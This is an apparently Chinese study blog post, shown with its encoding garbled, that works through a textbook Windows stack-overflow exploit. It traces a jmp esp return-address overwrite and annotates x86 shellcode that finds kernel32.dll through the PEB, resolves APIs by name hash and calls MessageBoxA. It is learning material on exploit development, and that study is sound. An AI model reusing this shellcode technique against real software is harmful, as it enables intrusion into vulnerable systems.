<h3 id="è°ƒè¯•-1"><a href="#è°ƒè¯•-1" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><h4 id="strcpyä¹‹å"><a href="#strcpyä¹‹å" class="headerlink" title="strcpyä¹‹å"></a>strcpyä¹‹å</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162316226.png" alt="image-20220917162316226"></p>
<p>shellcodeå·²ç»å†™å…¥äº†</p>
<p>0x12FB24å­˜å‚¨çš„è¿”å›åœ°å€å·²ç»è¢«è¦†ç›–ä¸º0x77D47754A</p>
<h4 id="retnä¹‹å-1"><a href="#retnä¹‹å-1" class="headerlink" title="retnä¹‹å"></a>retnä¹‹å</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162545781.png" alt="image-20220917162545781"></p>
<p>è·³è½¬åˆ°jmp espæŒ‡ä»¤çš„åœ°å€,æ­¤æ—¶espæŒ‡å‘0x12FB28,å¯¹åº”æŠ¬æ ˆè·³è½¬ä¸¤æ¡æŒ‡ä»¤(ä¸­é—´å¡«äº†ä¸€ä¸ªnop(0x90))</p>
<h4 id="ç¬¬ä¸€ä¸ªjmp-espä¹‹å"><a href="#ç¬¬ä¸€ä¸ªjmp-espä¹‹å" class="headerlink" title="ç¬¬ä¸€ä¸ªjmp espä¹‹å"></a>ç¬¬ä¸€ä¸ªjmp espä¹‹å</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162846919.png" alt="image-20220917162846919"></p>
<p>æŠ¬æ ˆä¹‹åesp&#x3D;0x12FA88,è¿™é‡Œä¸Šä¸‹éƒ½æ˜¯0x90,å…¨æ˜¯nop,ç„¶åé©¬ä¸Šå°±è¦ä¸€ä¸ªjmp espè·³è¿›æ¥</p>
<h4 id="ç¬¬äºŒä¸ªjmp-espä¹‹å"><a href="#ç¬¬äºŒä¸ªjmp-espä¹‹å" class="headerlink" title="ç¬¬äºŒä¸ªjmp espä¹‹å"></a>ç¬¬äºŒä¸ªjmp espä¹‹å</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917163016363.png" alt="image-20220917163016363"></p>
<p>æ­¤åeipå°†æ²¿ç€0x12FA88-&gt;0x12FA89è¿™ä¸ªå¢å¤§çš„æ–¹å‘è¿›å±•</p>
<p>åœ¨0x12FAB8å¤„å°†ä¼šç¢°è§ç¬¬ä¸€æ¡æœ‰æ„ä¹‰çš„æŒ‡ä»¤,æŠ¬æ ˆ1234h,æ˜¾ç„¶è¿™æ˜¯ä¸å¿…è¦çš„,å› ä¸ºç¬¬äºŒä¸ªjmp espä¹‹å‰,å·²ç»æŠŠespæ”¾åˆ°ä¸ä¼šå½±å“shellcodeçš„ä½ç½®äº†</p>
<h2 id="é€šç”¨shellcode"><a href="#é€šç”¨shellcode" class="headerlink" title="é€šç”¨shellcode"></a>é€šç”¨shellcode</h2><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><h4 id="åŠ¨æ€å®šä½åº“å‡½æ•°çš„æ–¹æ³•"><a href="#åŠ¨æ€å®šä½åº“å‡½æ•°çš„æ–¹æ³•" class="headerlink" title="åŠ¨æ€å®šä½åº“å‡½æ•°çš„æ–¹æ³•"></a>åŠ¨æ€å®šä½åº“å‡½æ•°çš„æ–¹æ³•</h4><p>å‰é¢çš„æ–¹æ³•ä»ç„¶ä¸æ˜¯é€šç”¨çš„,ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Š,user32.dllåº“çš„åœ°å€æ˜¯å¯å˜çš„,å…¶ä¸­å‡½æ•°çš„åœ°å€è‡ªç„¶ä¹Ÿæ˜¯å¯å˜çš„,è€Œæˆ‘ä»¬åœ¨å¯»æ‰¾ç¬¬ä¸€ä¸ªjmp espæ—¶ä½¿ç”¨äº†åº“å‡½æ•°çš„ç»å¯¹åœ°å€.</p>
<p>è¿™å°±æ˜¯å±€é™æ€§çš„æ ¹æºæ‰€åœ¨</p>
<p>è¦å…‹æœè¿™ä¸ªå±€é™æ€§,å¿…é¡»åœ¨shellcodeè¿è¡Œæ—¶,åŠ¨æ€åœ°å¯»æ‰¾ç›®çš„å‡½æ•°æˆ–è€…ç›®çš„æŒ‡ä»¤,è€Œä¸æ˜¯æˆ‘ä»¬äº²è‡ªæ‰¾äº†ç»™ä»–å†™æ­»</p>
<p>åœ¨win32å¹³å°ä¸‹,åŠ¨æ€å®šä½kernel32.dllä¸­å‡½æ•°åœ°å€çš„æ–¹æ³•æ˜¯è¿™æ ·çš„:</p>
<p>1.FSæ®µé€‰æ‹©å­ä¼šæŒ‡å‘å…¨å±€æ®µæè¿°è¡¨ä¸­æœ¬ç¨‹åºçš„TEBæè¿°ç¬¦,é€šè¿‡TEBæè¿°ç¬¦ä¸­çš„åŸºåœ°å€å¯ä»¥æŸ¥åˆ°å†…å­˜ä¸­çš„TEBè¡¨</p>
<blockquote>
<p>TEB,thread environment block,çº¿ç¨‹ç¯å¢ƒå—,å­˜æ”¾è¿›ç¨‹ä¸­çš„çº¿ç¨‹ä¿¡æ¯,ä¸€ä¸ªè¿›ç¨‹ä¸­çš„æ¯ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰ä¸€ä¸ªTEB,æ¯ä¸ªè¿›ç¨‹è‡ªå·±ä¼šæœ‰ä¸€ä¸ªPEB</p>
</blockquote>
<p>2.TEBè¡¨çš„0x30åç§»å¤„,å­˜æ”¾ç€PEBçš„æŒ‡é’ˆ</p>
<p>3.PEBè¡¨çš„0x0Cåç§»å¤„,å­˜æ”¾ç€PEB_LDR_DATAç»“æ„ä½“çš„æŒ‡é’ˆ</p>
<p>4.PEB_LDR_DATAç»“æ„ä½“çš„0x1Cåç§»å¤„,å­˜æ”¾ç€InInitializationOrderModuleListæŒ‡é’ˆ</p>
<blockquote>
<p>InInitializationOrderModuleList,æ¨¡å—åˆå§‹åŒ–<strong>é“¾è¡¨</strong></p>
</blockquote>
<p>5.InInitializationOrderModuleListè¡¨ä¸­,æŒ‰é¡ºåºå­˜æ”¾ç€æœ¬ç¨‹åºè¿è¡Œæ—¶è£…è½½çš„æ¨¡å—ä¿¡æ¯,ç¬¬ä¸€ä¸ªç»“ç‚¹æ˜¯ntdll.dllçš„ä¿¡æ¯,ç¬¬äºŒä¸ªç»“ç‚¹æ˜¯kernel32.dllçš„ä¿¡æ¯</p>
<p>6.kernel32.dllç»“ç‚¹ä¸­,åç§»é‡ä¸º0x08å¤„å°±æ˜¯kernel32.dllçš„å†…å­˜åŸºåœ°å€æŒ‡é’ˆ</p>
<p>7.kernel32.dllçš„åŸºåœ°å€åŠ ä¸Š0x3Cæ˜¯kernel32.dllçš„PEå¤´</p>
<p>8.kernel32.dllçš„PEå¤´çš„0x78åç§»å¤„,å­˜æ”¾å‡½æ•°å¯¼å‡ºè¡¨æŒ‡é’ˆ</p>
<p>9.åœ¨å¯¼å‡ºè¡¨ä¸­:</p>
<p>å¯¼å‡ºè¡¨çš„0x1Cåç§»å¤„,å­˜æ”¾å¯¼å‡ºå‡½æ•°åç§»åœ°å€(RVA)åˆ—è¡¨çš„æŒ‡é’ˆ</p>
<p>å¯¼å‡ºè¡¨çš„0x20åç§»å¤„,å­˜æ”¾å¯¼å‡ºå‡½æ•°å‡½æ•°ååˆ—è¡¨çš„æŒ‡é’ˆ</p>
<p>ä¸€ä¸ªå¯¼å‡ºå‡½æ•°åœ¨å‡½æ•°åè¡¨å’Œå¯¼å‡ºåœ°å€è¡¨ä¸­çš„ä¸‹æ ‡æ˜¯ç›¸åŒçš„,ç”¨å‡½æ•°åæŸ¥å‡½æ•°åè¡¨è·å¾—ä¸‹æ ‡,ç„¶åç”¨ä¸‹æ ‡æŸ¥å¯¼å‡ºåœ°å€è¡¨,å°±å¯ä»¥è·å¾—å‡½æ•°åœ°å€(RVA)</p>
<p>RVA(function)+ImageBase(kernel32.dll)&#x3D;VA(function),è¿™é‡Œkernel32.dllçš„æ˜ åƒåŸºå€å·²ç»åœ¨ç¬¬6æ­¥è·å¾—äº†</p>
<p>åœ¨kernel32.dllä¸­æ‰¾åˆ°LoadLibraryå’ŒGetProcAddressä¸¤ä¸ªå‡½æ•°ä¹‹å,å°±å¯ä»¥æ— è„‘è°ƒç”¨å‡½æ•°æ¥è·å–åº“å‡½æ•°åœ°å€äº†,ä¸ç”¨å†ç»å†1-9çš„æ­¥éª¤äº†</p>
<p>ä»å›¾ä¸Šçœ‹è¿™ä¸ªè¿‡ç¨‹,èƒ½ç”»å‡ºè¿™ä¸ªå›¾æ¥çš„è€å¸ˆå„¿ä¹Ÿé’ˆçš„ç»äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" alt="md,ç»äº†"></p>
<h4 id="shellcode-å¼€å‘ç¯å¢ƒ"><a href="#shellcode-å¼€å‘ç¯å¢ƒ" class="headerlink" title="shellcode å¼€å‘ç¯å¢ƒ"></a>shellcode å¼€å‘ç¯å¢ƒ</h4><p>æœ€æ–¹ä¾¿çš„shellcodeå¼€å‘æ–¹æ³•æ˜¯ä½¿ç”¨å†…è”æ±‡ç¼–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x66\x81\xEC\x40\x04\x33\xDBâ€¦â€¦&quot;</span>; <span class="comment">//æ¬²è°ƒè¯•çš„åå…­</span></span><br><span class="line">                                                     <span class="comment">//è¿›åˆ¶æœºå™¨ç &quot;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123; </span><br><span class="line">        lea eax, shellcode</span><br><span class="line">        push eax</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æ­¤å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°†æ§åˆ¶è½¬ç§»åˆ°shellcodeä¸­</p>
<p>æ¯”å¦‚æµ‹è¯•å¼¹çª—çš„shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] =</span><br><span class="line">    <span class="comment">//&quot;\x66\x81\xEC\x40\x04&quot; // SUB SP,440</span></span><br><span class="line">    <span class="string">&quot;\x33\xDB&quot;</span>             <span class="comment">// XOR EBX,EBX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\x68\x77\x65\x73\x74&quot;</span> <span class="comment">// PUSH 74736577</span></span><br><span class="line">    <span class="string">&quot;\x68\x66\x61\x69\x6C&quot;</span> <span class="comment">// PUSH 6C696166</span></span><br><span class="line">    <span class="string">&quot;\x8B\xC4&quot;</span>             <span class="comment">// MOV EAX,ESP</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>                 <span class="comment">// PUSH EAX</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>                 <span class="comment">// PUSH EAX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\xB8\xD7\xAD\xD3\x77&quot;</span> <span class="comment">// MOV EAX,user32.MessageBoxA//function address varies between os</span></span><br><span class="line">    <span class="string">&quot;\xFF\xD0&quot;</span>             <span class="comment">// CALL EAX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX ;/ExitCode</span></span><br><span class="line">    <span class="string">&quot;\xB8\xB5\x5C\xE5\x77&quot;</span> <span class="comment">// MOV EAX,kernel32.ExitProcess</span></span><br><span class="line">    <span class="string">&quot;\xFF\xD0&quot;</span>;            <span class="comment">// CALL EAX ;\ExitProcess</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hmod=LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);<span class="comment">//to ensure user32.dll is loaded </span></span><br><span class="line">    <span class="keyword">if</span>(!hmod)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm</span><br><span class="line">    &#123; </span><br><span class="line">        lea eax, shellcode</span><br><span class="line">        push eax</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917174306682.png" alt="image-20220917174306682"></p>
<h4 id="å“ˆå¸Œç®—æ³•"><a href="#å“ˆå¸Œç®—æ³•" class="headerlink" title="å“ˆå¸Œç®—æ³•"></a>å“ˆå¸Œç®—æ³•</h4><p>shellcodeè®²ç©¶ä¸€ä¸ªçŸ­å°ç²¾æ‚,å¦‚æœä¸ºäº†æ‰¾ä¸€ä¸ªåº“å‡½æ•°,æŠŠå®ƒçš„åå­—æ¯”å¦‚â€MessageBoxAâ€å®Œæ•´åœ°æ”¾åˆ°shellcodeä¸­,è‡ªç„¶ä¸æ„¿æ„.</p>
<p>è¦æ˜¯shellcodeçš„ç©ºé—´æœ‰é™,å…‰ä¸€ä¸ªå‡½æ•°åå°±å¯ä»¥å ç”¨å¾ˆå¤§ç©ºé—´,å¯èƒ½å°±æ²¡æœ‰è¶³å¤Ÿçš„åœ°æ–¹åšå®Œå‰©ä¸‹çš„é€»è¾‘äº†</p>
<p>å› æ­¤é‡‡ç”¨å“ˆå¸Œç®—æ³•å¤„ç†å‡½æ•°å,</p>
<p>æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°åå“ˆå¸Œä¸€ä¸‹,éå†åº“å‡½æ•°æ—¶æ¯ä¸ªå‡½æ•°åéƒ½å“ˆå¸Œä¸€ä¸‹,å’Œæˆ‘ä»¬è‡ªå·±çš„å“ˆå¸Œå€¼æ¯”åˆ’æ¯”åˆ’,è¦æ˜¯ä¸€æ ·å°±è®¤ä¸ºæ‰¾åˆ°äº†ç›®æ ‡å‡½æ•°</p>
<p>ä¹¦ä¸Šé‡‡ç”¨çš„å“ˆå¸Œç®—æ³•ä¸º:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetHash</span><span class="params">(<span class="type">char</span> *fun_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD digest = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*fun_name)</span><br><span class="line">    &#123;</span><br><span class="line">        digest = ((digest &lt;&lt; <span class="number">25</span>) | (digest &gt;&gt; <span class="number">7</span>)); <span class="comment">//å¾ªç¯å³ç§» 7 ä½</span></span><br><span class="line">        digest += *fun_name;                       <span class="comment">//ç´¯åŠ </span></span><br><span class="line">        fun_name++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> digest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡å¾ªç¯å³ç§»7ä½ç„¶ååŠ ä¸Šå‡½æ•°åçš„ä¸€ä¸ªå­—èŠ‚,ç›´åˆ°éå†å‡½æ•°ååˆ°NULL,ç®—æ³•ç»“æŸ,è¿”å›digestæ‘˜è¦å€¼</p>
<p>è¿™æ ·å“ˆå¸Œç®—æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªDWORDåŒå­—,æ¯”è¾ƒä¸¤ä¸ªåŒå­—åªéœ€è¦ä¸€æ¡æŒ‡ä»¤,cmp a,bå°±å¯ä»¥äº†</p>
<p>ç”¨è¯¥å“ˆå¸Œå‡½æ•°å¾—åˆ°çš„æ‘˜è¦å€¼:</p>
<table>
<thead>
<tr>
<th>å‡½æ•°å</th>
<th>æ‘˜è¦å€¼(Hex)</th>
</tr>
</thead>
<tbody><tr>
<td>MessageBoxA</td>
<td>1e380a6a</td>
</tr>
<tr>
<td>LoadLibraryA</td>
<td>c917432</td>
</tr>
<tr>
<td>ExitProcess</td>
<td>4fd18963</td>
</tr>
</tbody></table>
<p>å¥½äº†,ç°åœ¨ä¼šåš1+1&#x3D;2äº†,ä¸‹é¢è§£ä¸€é“è€ƒç ”é«˜æ•°é¢˜</p>
<h3 id="shellcodeåŠ¨æ€å®šä½API"><a href="#shellcodeåŠ¨æ€å®šä½API" class="headerlink" title="shellcodeåŠ¨æ€å®šä½API"></a>shellcodeåŠ¨æ€å®šä½API</h3><p>åˆ†æä¸€ä¸‹ä¹¦ä¸Šç»™å‡ºçš„shellcodeä»£ç éƒ½æ˜¯å¹²äº†å•¥</p>
<h4 id="åˆå§‹åŒ–-æ”¾ç½®éœ€è¦æŸ¥æ‰¾çš„å‡½æ•°"><a href="#åˆå§‹åŒ–-æ”¾ç½®éœ€è¦æŸ¥æ‰¾çš„å‡½æ•°" class="headerlink" title="åˆå§‹åŒ–,æ”¾ç½®éœ€è¦æŸ¥æ‰¾çš„å‡½æ•°"></a>åˆå§‹åŒ–,æ”¾ç½®éœ€è¦æŸ¥æ‰¾çš„å‡½æ•°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">nop ;ä¸ºäº†ä¾¿äºè§‚å¯Ÿ,shellcodeçš„å¼€å¤´ç»“å°¾éƒ½æ”¾å‡ ä¸ªnop</span><br><span class="line">nop</span><br><span class="line">CLD					; clear flag DF,æ”¹å˜ä¸²æ“ä½œçš„æ–¹å‘,ä¿è¯åœ¨æ‰§è¡Œshellcodeæ—¶æ˜¯æ­£æ–¹å‘çš„</span><br><span class="line">;store hash</span><br><span class="line">push 0x1e380a6a		;hash of MessageBoxA</span><br><span class="line">push 0x4fd18963		;hash of ExitProcess</span><br><span class="line">push 0x0c917432		;hash of LoadLibraryA</span><br><span class="line">mov esi,esp			; esi = addr of first function hash </span><br><span class="line">lea edi,[esi-0xc]	; edi = addr to start writing function </span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å¨æ‰§è¡Œå®Œæ¯•åæ ˆå¸§çš„çŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917184259697.png" alt="image-20220917184259697"></p>
<h4 id="æŠ¬æ ˆ"><a href="#æŠ¬æ ˆ" class="headerlink" title="æŠ¬æ ˆ"></a>æŠ¬æ ˆ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; make some stack space</span><br><span class="line">xor ebx,ebx ;ebxç½®ç©º</span><br><span class="line">mov bh, 0x04 		;ebx=0x400;	 </span><br><span class="line">sub esp, ebx    ;æ ˆé¡¶ä¸‹é™0x400ä¸ªå­—èŠ‚;</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917190658920.png" alt="image-20220917190658920"></p>
<h4 id="â€œuser32â€å‹æ ˆ"><a href="#â€œuser32â€å‹æ ˆ" class="headerlink" title="â€œuser32â€å‹æ ˆ"></a>â€œuser32â€å‹æ ˆ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; push a pointer to &quot;user32&quot; onto stack </span><br><span class="line">mov bx, 0x3233 		; rest of ebx is null &quot;32&quot;</span><br><span class="line">push ebx    ;0x3233å‹æ ˆ</span><br><span class="line">push 0x72657375     ;&quot;user&quot;</span><br><span class="line">push esp </span><br><span class="line"></span><br><span class="line">xor edx,edx	;edx=0</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191100826.png" alt="image-20220917191100826"></p>
<h4 id="å¯»æ‰¾kernel32-dllåŸºåœ°å€"><a href="#å¯»æ‰¾kernel32-dllåŸºåœ°å€" class="headerlink" title="å¯»æ‰¾kernel32.dllåŸºåœ°å€"></a>å¯»æ‰¾kernel32.dllåŸºåœ°å€</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; find base addr of kernel32.dll </span><br><span class="line">	mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">	mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">	mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">	mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" alt="ä¾æ®"></p>
<h4 id="æœ€å¤–åœˆå¾ªç¯-å¯»æ‰¾ä¸‹ä¸€ä¸ªåº“å‡½æ•°"><a href="#æœ€å¤–åœˆå¾ªç¯-å¯»æ‰¾ä¸‹ä¸€ä¸ªåº“å‡½æ•°" class="headerlink" title="æœ€å¤–åœˆå¾ªç¯,å¯»æ‰¾ä¸‹ä¸€ä¸ªåº“å‡½æ•°"></a>æœ€å¤–åœˆå¾ªç¯,å¯»æ‰¾ä¸‹ä¸€ä¸ªåº“å‡½æ•°</h4><p>åœ¨æ‰§è¡Œæœ¬éƒ¨åˆ†ä¹‹å‰,esiåœ¨æ ˆä¸­çš„æŒ‡å‘å¦‚å›¾</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191632775.png" alt="image-20220917191632775"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line"></span><br><span class="line">	lodsd 					; load next hash into al and increment esi </span><br><span class="line">	cmp eax, 0x1e380a6a		; hash of MessageBoxA - trigger </span><br><span class="line">							; LoadLibrary(&quot;user32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0x8] 		; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of user32.dll 	</span><br></pre></td></tr></table></figure>

<blockquote>
<p>lodsdæŒ‡ä»¤ï¼Œå–å¾—æ˜¯åŒå­—èŠ‚ï¼Œå³mov eaxï¼Œ[esi]ï¼Œesi&#x3D;esi+4ï¼›</p>
</blockquote>
<p>æ­¤å¤„lodsdç›¸å½“äºæŠŠ0x0c917432æ”¾åˆ°eaxä¸Š,ç„¶åesi+4,æ‰§è¡Œåæ ˆçš„çŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191748156.png" alt="image-20220917191748156"></p>
<p>æ˜¾ç„¶eax&#x3D;0x0c917432!&#x3D;0x1e380a6a,jneæ¡ä»¶è½¬ç§»å®ç°</p>
<p>å› æ­¤è·³è½¬find_functions</p>
<blockquote>
<p>å¦‚æœè¿™é‡Œeax&#x3D;0x1e380a6aå³æ„å‘³ç€è¦å¯»æ‰¾MessageBoxAå‡½æ•°åœ°å€,åˆ™jneæ¡ä»¶ä¸æ»¡è¶³,é¡ºåºæ‰§è¡Œ,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xchg eax, ebp 			; save current hash </span><br><span class="line">call [edi - 0x8] 		; LoadLibraryA </span><br><span class="line">xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">						; with base address of user32.dll 	</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œedi-0x8æ˜¯LoadLibraryAçš„åœ°å€,æ˜¾ç„¶æ˜¯å·²ç»è·å–LoadLibraryAçš„åœ°å€äº†,è¿™æ˜¯åè¯äº†</p>
</blockquote>
<h4 id="éå†ä¸¤ä¸ªè¡¨å¯»æ‰¾ç›®æ ‡å‡½æ•°"><a href="#éå†ä¸¤ä¸ªè¡¨å¯»æ‰¾ç›®æ ‡å‡½æ•°" class="headerlink" title="éå†ä¸¤ä¸ªè¡¨å¯»æ‰¾ç›®æ ‡å‡½æ•°"></a>éå†ä¸¤ä¸ªè¡¨å¯»æ‰¾ç›®æ ‡å‡½æ•°</h4><h5 id="å¼€ç«¯"><a href="#å¼€ç«¯" class="headerlink" title="å¼€ç«¯"></a>å¼€ç«¯</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find_functions: </span><br><span class="line">	pushad 						; preserve registers </span><br><span class="line">	mov eax, [ebp + 0x3c]		; eax = start of PE header </span><br><span class="line">	mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table </span><br><span class="line">	add ecx, ebp 				; ecx = absolute addr of export table </span><br><span class="line">	mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table </span><br><span class="line">	add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">	xor edi, edi 				; edi will count through the functions </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰€æœ‰é€šç”¨å¯„å­˜å™¨å‹æ ˆä¿å­˜,ç„¶åå„å¸å…¶èŒè®¾ç½®å‚æ•°</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917195103779.png" alt="image-20220917195103779"></p>
<p>åœ¨æ­¤ä¹‹å‰ebpæ˜¯æŒ‡å‘kernel32.dllçš„åŸºåœ°å€çš„,å…¶ä»–å„ä¸ªæ•°å€¼ä¾æ®ebpåŠ ä¸Šåç§»é‡å¾—åˆ°</p>
